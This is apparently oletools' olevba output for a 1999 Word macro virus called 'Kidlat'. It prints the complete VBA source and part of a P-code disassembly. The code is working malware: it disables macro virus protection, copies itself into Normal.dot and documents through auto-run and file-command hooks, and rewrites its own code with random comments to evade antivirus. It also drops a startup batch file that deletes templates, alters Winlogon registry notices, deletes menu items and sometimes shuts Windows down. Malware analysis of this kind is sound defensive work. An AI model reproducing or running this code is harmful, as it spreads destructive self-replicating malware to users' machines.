olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.de - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kidlat.bas 
in file: Virus.MSWord.VMPCK1.de - OLE stream: 'Macros/VBA/Kidlat'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
Rem MfQeUsHeUnEgQqBoRgTpLyKnErOhFgJxQi
        
Sub Kidlat()
    
    '+++++++++++++++++++++++++++++++++++++++++++++++++++
Rem TkRlOmOoRzFjSzRmSpHoQuQvHgDpFyQyJzQjLpLiTvVoLz
    'Virus Name: Kidlat
    'Author: Lucky Warrior
Rem NvSwEhRzMeSsHeFuJtLeRnShEkNsNvHiLgNvOkNyAzIkCiBfFpLmFnBj
    'Copyright (c) 1999 Bgy. Tiguib, Oras, Eastern Samar
    'All rights reserved.
    '+++++++++++++++++++++++++++++++++++++++++++++++++++

    'Many Thanx To my Friends & Roommates, namely:
    'Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
    
    'A Special Thanx To... HCA Batch '95 (O.E.S)
    
    'And a Very Special Thanx To... Pamela
    
On Error Resume Next
Randomize
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("Kidlat").Export "c:\Kidlat.drv"
Rem PoNgPfQnJwRnIfCyTjOoMiNlJjJqMwVnUeAxJtUsGtLfLlJsTfLqUqLtEwUnAyJlDlDo
ActiveDocument.ReadOnlyRecommended = False
DyMs = Int(Rnd * 10)
If DyMs = 3 Then Call AdditionalSideEffects
If Month(Now) = 8 And Day(Now) = 13 Then MsgBox "Happy Birthday Lucky Warrior!!!", vbInformation, "Microsoft Team Says..."
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "Lucky Warrior"
    .Comments = "Kidlat"
    .Execute
Rem HvNlEoUxQwFqItIfEnBtFkNsFrPgKtJrEhQhRuUuTxJxQiVe
End With
 MakeIt$ = Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(109) + Chr(115) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
YouNeedME = GetAttr(NormalTemplate.FullName)
Rem VkHeLhOkIoCsNqVrBkJpNnFlJoQuJrAqGhGlMqQhPsIv
If YouNeedME = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call Damn(MakeIt$)
If YouNeedME = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call Damn(MakeIt$)
If YouNeedME = vbReadOnly Then GoTo SuckIt
If YouNeedME = vbReadOnly + vbArchive Then GoTo SuckIt
If NormalTemplate.VBProject.VBComponents.Item("Kidlat").Name <> "Kidlat" Then YouHateMe = True
If ActiveDocument.VBProject.VBComponents.Item("Kidlat").Name <> "Kidlat" Then IHateYou = True
If YouHateMe = True And IHateYou = False Then Set CallOff = NormalTemplate.VBProject.VBComponents
If YouHateMe = False And IHateYou = True Then Set CallOff = ActiveDocument.VBProject.VBComponents
CallOff.import "c:\Kidlat.drv"
If YouHateMe = True And IHateYou = False Then Shell ("label c: Kidlat"), 0
If YouHateMe = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If IHateYou = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
Rem UxJqByLoDtPtUkKxBlRxQeEuMzNnUxChEuTxQhQgNfMsTlDjClIoUtJiCnHvRpAhQg
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeCaption") = "Lucky Warrior"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon", "LegalNoticeText") = "Kidlat is now ready to fuck your system!!!"
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete

SuckIt:
End Sub

Sub FuckTheAV()
On Error Resume Next
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Kidlat").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("Kidlat").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
Rem CnRfQkOnFgFiQvElLyHuSeFjTlRpVmQjVrDsBfKlMqFfGjSiAxNeUzFpTtDoJmMpHzJuFiQoPkGzFp
With Application.VBE.ActiveVBProject.VBComponents("Kidlat").CodeModule
PolySize = Int(Rnd * 10)
For Polymorphic = 1 To PolySize
Rem MtTgMlRuFmCfStCwQuNgCh
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
Rem SvJkJrStMoRtCzVzLqGeCpStOlAgHtEsOjBoSzUzJrPuCmMtPeGkNyQlIwLsJjRlFu
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next Polymorphic
End With
End If
End Sub

Sub HelpAbout()
    On Error Resume Next
    MsgBox "Kidlat by Lucky Warrior", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call Kidlat
    Call FuckTheAV
Rem LnPoLmOuMjKmIhRhIrVuJp
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Kidlat
End Sub
Sub FileSave()
    On Error Resume Next
Rem AlOgJkDjDeTzBfBrLuHtCyRnHqPzSsSsQrSvAsBkKqFgUtDiHgMnIkHiLqAyQlMy
    Call Kidlat
    Call FuckTheAV
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Kidlat
    Call FuckTheAV
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Rem StBfJnLhCmNoQzFiFkDkGkBrQkAeCjAzAfNjKhIuSlRfHgGrRsKtOwVhVsAxDvOgHqUlOy
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Kidlat
End Sub
Sub EditFind()
Rem DyBoMhBgPwIqMuHuMtJqSzNeEoNmRnHvLkVsJtQfHeLvUvFvStRzCrBhAyHlSnQhHsEq
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
    Call Kidlat
Rem RgMiLs
    Call FuckTheAV
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Kidlat
    Call FuckTheAV
End Sub
Sub FilePrint()
    On Error Resume Next
Rem IyAeUxGsMwGtJgOyRx
Rem ApBoRvUeGoSeNfTtMiKyPuUjPzHsTzTpDqHrThLkJyNpMoUkJnSg
Dialogs(wdDialogFilePrint).Show
    Call Kidlat
Rem Ru
    Call FuckTheAV
End Sub
Sub FileExit()
    On Error Resume Next
    Call Kidlat
    Call FuckTheAV
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Kidlat
    Call FuckTheAV
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Kidlat
    Call FuckTheAV
End Sub
Sub AutoExec()
Rem KeDmLmOsTwFvRhRlDeDjQgQrUtVkJiNmKm
    On Error Resume Next
    Call Kidlat
    Call FuckTheAV
End Sub
Sub AutoClose()
    On Error Resume Next
Rem JkKxMp
    Call Kidlat
    Call FuckTheAV
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
Sub AdditionalSideEffects()
    On Error Resume Next
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Tasks.ExitWindows
End Sub
    
Sub Damn(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(49) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
Rem MiLoMuUyUqBwHoDePyQiUkAiStHnIrFpAiIrMpRgVjPs
Rem JsOeRfBrCeFsClNsVnIlJeVkUeAoTsHqPsFtLhEnLlNfEqRe
snag1$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(50) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
Rem GfAvVoEjGzPoDhFsUsQePrPzDsDzJyLpIrIlUiJxSwVgRyInGyVyIpBx
Part2$ = Chr(100) + Chr(101) + Chr(108)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(109) + Chr(115) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
Close hFile
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.VMPCK1.de
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Kidlat - 22009 bytes
' Line #0:
' Line #1:
' 	Dim (Public) 
' 	VarDefn Skip (As Integer)
' Line #2:
' 	Rem 0x0023 " MfQeUsHeUnEgQqBoRgTpLyKnErOhFgJxQi"
' Line #3:
' Line #4:
' 	FuncDefn (Sub Kidlat())
' Line #5:
' Line #6:
' 	QuoteRem 0x0004 0x0033 "+++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #7:
' 	Rem 0x002F " TkRlOmOoRzFjSzRmSpHoQuQvHgDpFyQyJzQjLpLiTvVoLz"
' Line #8:
' 	QuoteRem 0x0004 0x0012 "Virus Name: Kidlat"
' Line #9:
' 	QuoteRem 0x0004 0x0015 "Author: Lucky Warrior"
' Line #10:
' 	Rem 0x0039 " NvSwEhRzMeSsHeFuJtLeRnShEkNsNvHiLgNvOkNyAzIkCiBfFpLmFnBj"
' Line #11:
' 	QuoteRem 0x0004 0x0033 "Copyright (c) 1999 Bgy. Tiguib, Oras, Eastern Samar"
' Line #12:
' 	QuoteRem 0x0004 0x0014 "All rights reserved."
' Line #13:
' 	QuoteRem 0x0004 0x0033 "+++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #14:
' Line #15:
' 	QuoteRem 0x0004 0x002D "Many Thanx To my Friends & Roommates, namely:"
' Line #16:
' 	QuoteRem 0x0004 0x0034 "Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel"
' Line #17:
' Line #18:
' 	QuoteRem 0x0004 0x002B "A Special Thanx To... HCA Batch '95 (O.E.S)"
' Line #19:
' Line #20:
' 	QuoteRem 0x0004 0x0025 "And a Very Special Thanx To... Pamela"
' Line #21:
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	ArgsCall Read 0x0000 
' Line #24:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #25:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #27:
' 	LitStr 0x000D "c:\Kidlat.drv"
' 	LitStr 0x0006 "Kidlat"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #28:
' 	Rem 0x0045 " PoNgPfQnJwRnIfCyTjOoMiNlJjJqMwVnUeAxJtUsGtLfLlJsTfLqUqLtEwUnAyJlDlDo"
' Line #29:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #30:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St DyMs 
' Line #31:
' 	Ld DyMs 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) AdditionalSideEffects 0x0000 
' 	EndIf 
' Line #32:
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "Happy Birthday Lucky Warrior!!!"
' 	Ld vbInformation 
' 	LitStr 0x0016 "Microsoft Team Says..."
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #33:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #34:
' 	LitStr 0x000D "Lucky Warrior"
' 	MemStWith Author 
' Line #35:
' 	LitStr 0x0006 "Kidlat"
' 	MemStWith Comments 
' Line #36:
' 	ArgsMemCallWith Execute 0x0000 
' Line #37:
' 	Rem 0x0031 " HvNlEoUxQwFqItIfEnBtFkNsFrPgKtJrEhQhRuUuTxJxQiVe"
' Line #38:
' 	EndWith 
' Line #39:
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St MakeIt$ 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St YouNeedME 
' Line #41:
' 	Rem 0x002D " VkHeLhOkIoCsNqVrBkJpNnFlJoQuJrAqGhGlMqQhPsIv"
' Line #42:
' 	Ld YouNeedME 
' 	Ld vbReadOnly 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld MakeIt$ 
' 	ArgsCall (Call) Damn 0x0001 
' 	EndIf 
' Line #43:
' 	Ld YouNeedME 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	Ld System 
' 	MemLd OperatingSystem 
' 	LitStr 0x0007 "Windows"
' 	Eq 
' 	And 
' 	Ld System 
' 	MemLd LanguageDesignation 
' 	LitStr 0x0016 "English(United States)"
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld MakeIt$ 
' 	ArgsCall (Call) Damn 0x0001 
' 	EndIf 
' Line #44:
' 	Ld YouNeedME 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo SuckIt 
' 	EndIf 
' Line #45:
' 	Ld YouNeedME 
' 	Ld vbReadOnly 
' 	Ld vbArchive 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo SuckIt 
' 	EndIf 
' Line #46:
' 	LitStr 0x0006 "Kidlat"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Kidlat"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St YouHateMe 
' 	EndIf 
' Line #47:
' 	LitStr 0x0006 "Kidlat"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Kidlat"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IHateYou 
' 	EndIf 
' Line #48:
' 	Ld YouHateMe 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld IHateYou 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set CallOff 
' 	EndIf 
' Line #49:
' 	Ld YouHateMe 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld IHateYou 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set CallOff 
' 	EndIf 
' Line #50:
' 	LitStr 0x000D "c:\Kidlat.drv"
' 	Ld CallOff 
' 	ArgsMemCall import 0x0001 
' Line #51:
' 	Ld YouHateMe 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld IHateYou 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "label c: Kidlat"
' 	Paren 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' 	EndIf 
' Line #52:
' 	Ld YouHateMe 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Skip 
' 	LitDI2 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #53:
' 	Ld IHateYou 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #54:
' 	Rem 0x0043 " UxJqByLoDtPtUkKxBlRxQeEuMzNnUxChEuTxQhQgNfMsTlDjClIoUtJiCnHvRpAhQg"
' Line #55:
' 	LitStr 0x000D "Lucky Warrior"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x0012 "LegalNoticeCaption"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #56:
' 	LitStr 0x002A "Kidlat is now ready to fuck your system!!!"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon"
' 	LitStr 0x000F "LegalNoticeText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #57:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #58:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #59:
' Line #60:
' 	Label SuckIt 
' Line #61:
' 	EndSub 
' Line #62:
' Line #63:
' 	FuncDefn (Sub FuckTheAV())
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	ArgsCall Read 0x0000 
' Line #66:
' 	LitStr 0x0006 "Kidlat"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #67:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #68:
' 	StartWithExpr 
' 	LitStr 0x0006 "Kidlat"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #69:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #70:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' 	EndWith 
' Line #73:
' 	ElseBlock 
' Line #74:
' 	Rem 0x004F " CnRfQkOnFgFiQvElLyHuSeFjTlRpVmQjVrDsBfKlMqFfGjSiAxNeUzFpTtDoJmMpHzJuFiQoPkGzFp"
' Line #75:
' 	StartWithExpr 
' 	LitStr 0x0006 "Kidlat"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #76:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #77:
' 	StartForVariable 
' 	Ld Polymorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #78:
' 	Rem 0x0017 " MtTgMlRuFmCfStCwQuNgCh"
' Line #79:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #80:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #81:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #82:
' 	Rem 0x0043 " SvJkJrStMoRtCzVzLqGeCpStOlAgHtEsOjBoSzUzJrPuCmMtPeGkNyQlIwLsJjRlFu"
' Line #83:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #84:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #85:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #86:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #88:
' 	StartForVariable 
' 	Ld Polymorphic 
' 	EndForVariable 
' 	NextVar 
' Line #89:
' 	EndWith 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
' 	FuncDefn (Sub HelpAbout())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	LitStr 0x0017 "Kidlat by Lucky Warrior"
' 	Ld vbInformation 
' 	ArgsCall MsgBox 0x0002 
' Line #96:
' 	EndSub 
' Line #97:
' 	FuncDefn (Sub FileNew())
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #100:
' 	ArgsCall (Call) FuckTheAV 0x0000 
' Line #101:
' 	Rem 0x0017 " LnPoLmOuMjKmIhRhIrVuJp"
' Line #102:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #103:
' 	LitDI2 0x0001 
' 	St Skip 
' Line #104:
' 	ArgsCall (Call) Kidlat 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub FileSave())
' Line #107:
' 	OnError (Resume Next) 
' Line #108:
' 	Rem 0x0041 " AlOgJkDjDeTzBfBrLuHtCyRnHqPzSsSsQrSvAsBkKqFgUtDiHgMnIkHiLqAyQlMy"
' Line #109:
' 	ArgsCall (Call) Kidlat 0x0000 
